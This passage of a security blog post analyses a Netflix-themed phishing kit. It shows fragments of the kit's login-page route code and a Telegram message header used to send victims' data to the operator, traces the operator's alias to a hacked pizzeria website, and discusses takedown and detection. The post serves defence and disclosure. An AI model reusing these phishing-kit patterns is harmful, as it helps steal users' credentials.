res<span class="token punctuation">.</span><span class="token method function property-access">redirect</span><span class="token punctuation">(</span><span class="token string">'/auth/login/3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
exports<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">login3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span> res<span class="token punctuation">.</span><span class="token method function property-access">render</span><span class="token punctuation">(</span><span class="token string">'login3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token spread operator">...</span><span class="token punctuation">]</span>
</code></pre></div> <p>That is about the end of the story, after the attacker gets these messages, they win.</p> <h2 id="mitigation"><a href="#mitigation" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Mitigation</h2> <p>Phishing sites are disposable and can be stood up quickly. An orchestrated email campaign can direct thousands of visitors to a fraudulent site within a short time. Props to the folks over at <a href="https://netcraft.com" rel="nofollow noopener noreferrer" target="_blank">Netcraft</a>; they're on the ball with reporting these shady sites to domain owners.</p> <p>Unfortunately, in the brief interval between the scam emails being sent, detection occurring, notification of the domain owner, and subsequent takedown - Some will fall for it. Delaying detection for as long as possible is key for these scams. We've showed just two of the ways it is done.</p> <p>For service providers like us, both DAST and SAST (Dynamic and Static Application Security Testing) are critical to identifying such scams before they even go live. While it is still very easy to create disposable GitHub accounts to distribute this code, most disposable accounts are obvious. Combining suspicious code detection with user traits helps us flag and triage malicious activity.</p> <p>In September, GitHub is turning on MFA by default. That will help. What about Telegram and Proton? Time to step up and take action against malicious disposable accounts on your platforms.</p> <h2 id="the-mystery"><a href="#the-mystery" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>The mystery</h2> <p>When browsing the code, something stood out to me. The Telegram message header:</p> <div class="nuxt-content-highlight"><pre class="line-numbers language-text"><code>`👾 SHAKESWORDE | NETFL1X | USER_${ipAddress}\n\n` + </code></pre></div> <p>What or who is <code>SHAKESWORDE</code>? Is it some kind of cool 1337 haxor name?</p> <p align="center"> <img format="webp" loading="lazy" src="https://media0.giphy.com/media/Q2W4hziDOyzu0/giphy.gif?cid=ecf05e470qrb82k3b4fvpxh5l7l3up9tyefvhfmm09cntn3u&ep=v1_gifs_search&rid=giphy.gif&ct=g"> </p> <p>So I googled it -</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/shakesworde.png" width="650px"> </p> <div class="nuxt-content-highlight"><pre class="line-numbers language-text"><code>00 -25% Scampages New Chase Bank Scam Page 2023 $ 200. ... Huntington Scampage (With Free Hosting and Domain) Williams Shakesworde 89 Views 3:16 Wells Fargo ... </code></pre></div> <p>Google's result seemed to find a site that lists some names of banks. Looks relevant..</p> <p>The page from the result - <code>https://rose-lauchheim.de/zmcheldj/scampages.html</code> as well as the root domain <code>https://rose-lauchheim.de</code> are down.</p> <p>Maybe Wayback Machine caught it?</p> <p>No luck for <code>scampages.html</code> but the root domain was captured in 2022:</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/pizza.png" width="650px"> </p> <p>Pizza. It now made sense that Pizza Rosa in the German countryside was once a victim of an injection attack. <code>SHAKESWORDE</code> or somebody exploited their server and put that content there.</p> <p>I eventually found listings on GitHub under the <a href="https://github.com/topics/scampage" rel="nofollow noopener noreferrer" target="_blank">scampage topic</a>.</p> <p>There were multiple repositories listing scampages for different targets with anti-bot features just like in the Netflix case above.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/scampage_github.png" width="650px"> </p> <p>I reported these. Hopefully GitHub takes them down quickly, but unfortunately until problems with disposable accounts are mitigated, they will probably be back.</p> <p>With that, not long after the grim discovery of the vicious attack on pizza - the mystery led to a dead end.</p> <h2 id="the-good-news"><a href="#the-good-news" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>The good news</h2> <p>While no longer hosted at the <code>rose-lauchheim.de</code> domain, Pizzeria Rose seems to still be operational in Lauchheim, Germany. According to their excellent <a href="https://www.google.com/maps/place/Pizzeria+Rose%2FEiskaffee/@48.8721486,10.2482284,15z/data=!4m16!1m9!3m8!1s0x47991f83d8fbf995:0x507a55878bfb43cf!2sPizzeria+Rose%2FEiskaffee!8m2!3d48.8721486!4d10.2482284!9m1!1b1!16s%2Fg%2F1tp0cmnw!3m5!1s0x47991f83d8fbf995:0x507a55878bfb43cf!8m2!3d48.8721486!4d10.2482284!16s%2Fg%2F1tp0cmnw?entry=ttu" rel="nofollow noopener noreferrer" target="_blank">Google reviews</a>, their pizza and pasta are delicious. The website button directs users to their <a href="https://www.facebook.com/profile.php?id=100063594878836" rel="nofollow noopener noreferrer" target="_blank">Facebook</a>.</p> <p align="center"> <img format="webp" loading="lazy" src="/content/scampage-blog/food.png" width="650px"> </p><figcaption align="center">An actual pizza from Pizzeria Rosa in Lauchheim, Germany</figcaption> <p></p> <p>The unexpected association with pizza might be kind of funny, but it underscores a critical point: no business is immune from the reach of cyber threats. Even a small local business like Pizzeria Rose can become an unwitting participant in a larger malicious campaign. It is a reminder that that cybersecurity is not just a concern for large corporations.</p> <p>If you're a business owner, or interested in learning more about how to protect yourself or your organization from cyber threats, there are some excellent resources available on vulnerabilities, attacks, and mitigation tactics:</p> <ul> <li><strong>Snyk Vulnerability Database</strong> - <a href="https://security.snyk.io/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>MITRE ATT&CK Knowledge Base of Adversary Tactics</strong> - <a href="https://attack.mitre.org/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>Common Vulnerabilities and Exposures (CVE)</strong>: <a href="https://cve.mitre.org/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>National Vulnerability Database (NVD)</strong>: <a href="https://nvd.nist.gov/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>OWASP (Open Web Application Security Project)</strong>: <a href="https://www.owasp.org/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>Exploit Database</strong>: <a href="https://www.exploit-db.com/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>Have I Been Pwned</strong>: <a href="https://haveibeenpwned.com/" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> <li><strong>NIST Cybersecurity Framework</strong>: <a href="https://www.nist.gov/cyberframework" rel="nofollow noopener noreferrer" target="_blank">Link</a></li> </ul></div></div></div> <section id="subscribe-form" class="common-section border !border-neutral-700 rounded-2xl w-full lg:w-[80%]
